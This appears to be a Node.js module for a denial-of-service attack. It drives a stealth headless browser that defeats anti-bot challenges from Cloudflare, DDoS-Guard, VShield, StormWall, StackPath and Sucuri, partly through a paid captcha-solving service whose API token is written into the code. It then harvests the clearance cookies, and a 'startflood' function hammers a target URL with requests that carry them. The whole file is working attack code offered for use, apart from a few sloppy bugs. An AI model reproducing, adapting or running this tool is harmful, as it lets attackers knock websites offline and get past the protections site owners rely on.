/*
Developed for my friend from Greece and peronal usage
*/

require('events').EventEmitter.defaultMaxListeners = 0;
const puppeteer = require('puppeteer-extra')

const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

const colors = require('colors');

const request = require('request');

let solvingTime = 8000;

function log(string) {
	let d = new Date();

	let hours = (d.getHours() < 10 ? "0" : "") + d.getHours();
	let minutes = (d.getMinutes() < 10 ? "0" : "") + d.getMinutes();
	let seconds = (d.getSeconds() < 10 ? "0" : "") + d.getSeconds();

	console.log(`(${hours}:${minutes}:${seconds}) ${string}`);
}

function cookiesToStr(cookies) {
	if (Array.isArray(cookies)) {
		return cookies.reduce((prev, {
			name,
			value
		}) => {
			if (!prev) return `${name}=${value}`;
			return `${prev}; ${name}=${value}`;
		}, "");
		return "";
	}
}

async function createBrowser(opt) {
	return new Promise((resolve, reject) => {
		log(`[info] ` + `Creating new chrome instance.`.brightCyan);

		puppeteer.use(StealthPlugin());
		puppeteer.use(RecaptchaPlugin({
			provider: {
				id: '2captcha',
				token: '0a79fe6c8938610ed39af058ed6adce4'
			},
			visualFeedback: true
		}))

		puppeteer.launch({
			headless: true,
			args: [
				//				`--proxy-server=http://${opt.proxy}`,
				'--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
				'--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
				`--window-size=1920,1080`,
				"--window-position=000,000",
				"--disable-dev-shm-usage",
				"--no-sandbox",
			]
		}).then(async (browser) => {
			log(`[info] ` + `Creating new chrome session.`.brightCyan);

			const page = await browser.newPage()

			await page.setUserAgent(opt.ua);
			await page.setJavaScriptEnabled(true);
			await page.setDefaultNavigationTimeout(120000);

			// Undetect
			await page.evaluateOnNewDocument(() => {
				Object.defineProperty(navigator, 'webdriver', {
					get: () => false
				});
			})

			await page.evaluateOnNewDocument(() => {
				Object.defineProperty(navigator, 'platform', {
					get: () => 'Win32'
				});
			})

			try {
				log(`[info] ` + `Connecting to web`.brightCyan);

				await page.goto(opt.url);

				log(`[info] ` + `Connected!`.brightCyan);
			}
			catch (Err) {
				await browser.close();
				reject(Err);
			}

			const body = await page.content();

			const shield = await autoDetect(body);

			switch (shield) {
				case "wrapper":
					log(`[info] ` + `Detected CF Wrapper...`.brightCyan);

					// waiting load of JS/Captcha
					await page.waitForTimeout(5000, {
						waitUntil: 'networkidle0'
					})

					// Captcha Detect
					const captcha = await page.$('#cf-hcaptcha-container');
					if (captcha) {
						log(`[info] ` + `Detected CF Captcha (Wrapper)...`.brightCyan);

						// Solver (Captcha)
						try {
							await page.waitForSelector('#cf-hcaptcha-container');
							log(`[info] ` + `Finded CF Captcha (Captcha System) solving...`.brightCyan);
							await page.solveRecaptchas();
						} catch (err) {
							log(`[info] ` + `Finded CF Unknown (Trying solve Button)...`.brightCyan);
							// Button solver
							const clickText = text => {
								return page.evaluate(text => [...document.querySelectorAll('*')].find(e => e.textContent.trim() === text).click(), text);
							};

							try {
								log(`[info] ` + `Clicking Button...`.brightCyan);
								await clickText('Verify I am not a bot');
							} catch (err) {
								log(`[info] ` + `Finded CF Unknown (Trying wait)...`.brightCyan);
								solvingTime = 7000;
							}
						}
					}

					break;
				case "uam":
					log(`[info] ` + `Solving UAM's...`.brightCyan);
					solvingTime = 8000;
					break;
				case "vshieldv1":
					log(`[info] ` + `Solving VShield v1...`.brightCyan);
					await page.mouse.move(99, 101);
					await page.mouse.down();
					await page.mouse.move(199, 199);
					await page.mouse.up();
					await page.mouse.move(101, 99);
					await page.mouse.down();
					await page.mouse.move(99, 199);
					await page.mouse.up();
					solvingTime = 8000;
					break;
				case "vshieldv2":
					log(`[info] ` + `Solving VShield v2...`.brightCyan);
					await page.mouse.move(99, 101);
					await page.mouse.down();
					await page.mouse.move(199, 199);
					await page.mouse.up();
					await page.mouse.move(101, 99);
					await page.mouse.down();
					await page.mouse.move(99, 199);
					await page.mouse.up();
					await page.keyboard.press('Enter');
					await page.keyboard.press('1');
					await page.keyboard.press('R');
					solvingTime = 8000;
					break;
				case "sjs":
					log(`[info] ` + `Solving STORMWALL JS...`.brightCyan);
					solvingTime = 2000;
					break;
				case "ddguam":
					log(`[info] Solving DDoS-Guard UAM...`.brightCyan);
					solvingTime = 6000;
					break;
				case "react":
					log(`[info] Solving React.SU UAM...`.brightCyan);
					solvingTime = 7000;
					break;
				case "stackuam":
					log(`[info] Solving StackPath UAM...`.brightCyan);
					solvingTime = 7000;
					break;
				case "stackcaptcha":
					log(`[info] Solving StackPath captcha...`);
					await page.solveRecaptchas();
					solvingTime = 13000;
					break;
				case "sucuriuam":
					log(`[info] Solving Sucuri UAM...`);
					solvingTime = 6000;
					break;

				// ASN / GEO Block
				case "ban":
					log(`[info] Session banned | ASN/GEO Block.`.brightRed);
					await browser.close();
					break;
				default:
					solvingTime = 8000;
					break;
			}

			await page.waitForTimeout(solvingTime, {
				waitUntil: 'networkidle0'
			});

			// detect again

			const bodyNew = await page.content();

			const shieldNew = await autoDetect(bodyNew);

			switch (shieldNew) {
				case "wrapper":
					log(`[info] ` + `Detected CF Wrapper...`.brightCyan);

					// waiting load of JS/Captcha
					await page.waitForTimeout(5000, {
						waitUntil: 'networkidle0'
					})

					// Captcha Detect
					const captcha = await page.$('#cf-hcaptcha-container');
					if (captcha) {
						log(`[info] ` + `Detected CF Captcha (Wrapper)...`.brightCyan);

						// Solver (Captcha)
						try {
							await page.waitForSelector('#cf-hcaptcha-container');
							log(`[info] ` + `Finded CF Captcha (Captcha System) solving...`.brightCyan);
							await page.solveRecaptchas();
						} catch (err) {
							log(`[info] ` + `Finded CF Unknown (Trying solve Button)...`.brightCyan);
							// Button solver
							const clickText = text => {
								return page.evaluate(text => [...document.querySelectorAll('*')].find(e => e.textContent.trim() === text).click(), text);
							};

							try {
								log(`[info] ` + `Clicking Button...`.brightCyan);
								await clickText('Verify I am not a bot');
							} catch (err) {
								log(`[info] ` + `Finded CF Unknown (Trying wait)...`.brightCyan);
								solvingTime = 7000;
							}
						}
					}

					break;
				case "uam":
					log(`[info] ` + `Solving UAM's...`.brightCyan);
					solvingTime = 8000;
					break;
				case "vshieldv1":
					log(`[info] ` + `Solving VShield v1...`.brightCyan);
					await page.mouse.move(99, 101);
					await page.mouse.down();
					await page.mouse.move(199, 199);
					await page.mouse.up();
					await page.mouse.move(101, 99);
					await page.mouse.down();
					await page.mouse.move(99, 199);
					await page.mouse.up();
					solvingTime = 8000;
					break;
				case "vshieldv2":
					log(`[info] ` + `Solving VShield v2...`.brightCyan);
					await page.mouse.move(99, 101);
					await page.mouse.down();
					await page.mouse.move(199, 199);
					await page.mouse.up();
					await page.mouse.move(101, 99);
					await page.mouse.down();
					await page.mouse.move(99, 199);
					await page.mouse.up();
					await page.keyboard.press('Enter');
					await page.keyboard.press('1');
					await page.keyboard.press('R');
					solvingTime = 8000;
					break;
				case "sjs":
					log(`[info] ` + `Solving STORMWALL JS...`.brightCyan);
					solvingTime = 2000;
					break;
				case "ddguam":
					log(`[info] Solving DDoS-Guard UAM...`.brightCyan);
					solvingTime = 6000;
					break;
				case "react":
					log(`[info] Solving React.SU UAM...`.brightCyan);
					solvingTime = 7000;
					break;
				case "stackuam":
					log(`[info] Solving StackPath UAM...`.brightCyan);
					solvingTime = 7000;
					break;
				case "stackcaptcha":
					log(`[info] Solving StackPath captcha...`);
					await page.solveRecaptchas();
					solvingTime = 13000;
					break;
				case "sucuriuam":
					log(`[info] Solving Sucuri UAM...`);
					solvingTime = 6000;
					break;

				// ASN / GEO Block
				case "ban":
					log(`[info] Session banned | ASN/GEO Block.`.brightRed);
					await browser.close();
					break;
				default:
					solvingTime = 8000;
					break;
			}

			await page.waitForTimeout(solvingTime, {
				waitUntil: 'networkidle0'
			});

			if (opt.precheck !== false) {
				log(`[info] Checking Title...`.brightCyan);

				let title = await page.title();
				if (title == opt.precheck) {
					log(`[info] Title check passed...`.brightCyan);
				}
				else {
					log(`[info] Don't passed`.brightYellow);
					await browser.close();
				}
			}
			else {
			}

			const cookies = await page.cookies();
			const cookie = cookiesToStr(cookies);

			log(`Cookies: ${cookie} | UA: ${opt.ua}`.brightCyan);

			// Returns Cookies | .then((cookie, same) => {...})
			resolve(cookie);

			await browser.close();
			return;

		});
	})
}

// --> Simple detect man -->
function autoDetect(body) {

	if (body.indexOf('#cf-wrapper') !== -1) {
		log(`[info] Detected: CF Wrapper`.brightYellow);
		return "wrapper";
	}
	else if (body.indexOf('Checking your browser before accessing</') !== -1) {
		log(`[info] Detected: CF_UAM`.brightYellow);
		return "uam";
	}
	else if (body.indexOf('dl.vshield.pro/ddos/bot-detector.js') !== -1) {
		log(`[info] Detected: VShield V1`.brightYellow);
		return "vshieldv1";
	}
	else if (body.indexOf('fw.vshield.pro/v2/bot-detector.js') !== -1) {
		log(`[info] Detected: VShield V2`.brightYellow);
		return "vshieldv2";
	}
	else if (body.indexOf('check.ddos-guard.net/check.js') !== -1) {
		log(`[info] Detected DDG_UAM`.brightYellow);
		return "ddguam";
	}
	else if (body.indexOf('Check your browser...') !== -1) {
		log(`[info] Detected REACT.SU_UAM`.brightYellow);
		return "react";
	}
	else if (body.indexOf('Site verification') !== -1) {
		log(`[info] Detected StackPath JS`.brightYellow);
		return "stackuam";
	}
	else if (body.indexOf('Verify I am not a bot') !== -1) {
		log(`[info] Detected CF_BUTTON`.brightYellow);
		return "cfbutton";
	}
	else if (body.indexOf('Please confirm that you are human, by typing the characters shown here:') !== -1) {
		log(`[info] Detected StackPath CAPTCHA`.brightYellow);
		return "stackcaptcha";
	}
	else if (body.indexOf('{},u,c,U,r,i,l=0') !== -1) {
		log(`[info] Detected Sucuri UAM`.brightYellow);
		return "sucuriuam";
	}
	else if (body.indexOf('Error code 1020') !== -1) {
		log(`[info] ` + `Detected 1 ban wrapper`.brightRed);
		if (body.indexOf('Access denied') !== -1) {
			log(`[info] ` + `Detected 2 ban wrapper`.brightRed);
			return "banned";
		}
	}
	else if (body.indexOf('__js_p_') !== -1) {
		log(`[info] ` + `Detected STORMWALL JS`.brightYellow);
		return "sjs";
	}
	else {
		log(`[info] Undetected JS`.brightCyan);
	}
}

function startflood(target, ip, cookie, ua) {
	setInterval(() => {
		
		log('tets')
			
		request.get({
			url: target,
			headers: {
				'cache-control': 'max-age=0',
				'dnt': '1',
				'upgrade-insecure-requests': '1',
				'user-agent': ua,
				'sec-fetch-dest': 'document',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'none',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'accept-language': 'en-US,en;q=0.9',
				'cookie': cookie
			}
		})
	})
}

module.exports = {
	log: log,
	createBrowser: createBrowser,
	startflood: startflood
};